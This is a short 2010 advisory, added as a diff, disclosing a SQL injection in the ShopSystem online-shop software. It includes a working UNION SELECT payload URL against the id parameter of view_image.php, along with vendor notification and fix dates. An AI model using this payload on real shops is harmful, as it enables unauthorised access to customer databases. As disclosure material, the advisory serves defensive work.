@@ -1,0 +1,38 @@
+# Exploit Title: ShopSystem SQL Injection vulnerability
+# Date: 05.04.2010
+# Author: Valentin
+# Category: webapps/0day
+
+
+:: General information
+:: ShopSystem SQL Injection vulnerability
+:: by Valentin Hoebel
+:: valentin@xenuser.org
+
+:: Product information
+:: Name = ShopSystem
+:: Vendor = ShopSystems
+:: Vendor Website = http://www.shopsystems.biz/
+:: About the product = http://www.shopsystems.biz/shopsystem/uebersichtshopsystem/mietshop.php
+:: Affected versions = Versions unknown
+
+
+:: SQL Injection vulnerability
+ShopSystems is a German IT company. They offer webdesign, hosting and training services. One of their most famous products is the software ShopSystem. It is an online shop and allows their customers to offer their products online.
+Like in other shops it is possible to provide pictures which show the product being offered.
+By clicking on the image the view gets enlarged (file: view_image.php) and MySQL injection through the ID parameter is possible.
+
+Vulnerable URL
+http://some-cool-domain.tld/shop/view_image.php?id=XX
+
+Exploit vulnerability, e.g. by displaying the current database:
+http://some-cool-domain.tld/shop/view_image.php?id=XX+AND+1=2+UNION+SELECT+concat(database()),2,3-
+
+Note: The MySQL output gets displayed within the image URL, so you have to view the source code of the current page in order to retrieve your information.
+
+
+:: Additional information
+:: Vendor notified = 05.04.2010
+:: Reply received = 05.04.2010
+:: Vulnerability fixed = 06.04.2010, some shops are still affected
+:: Advisory published = 06.04.2010
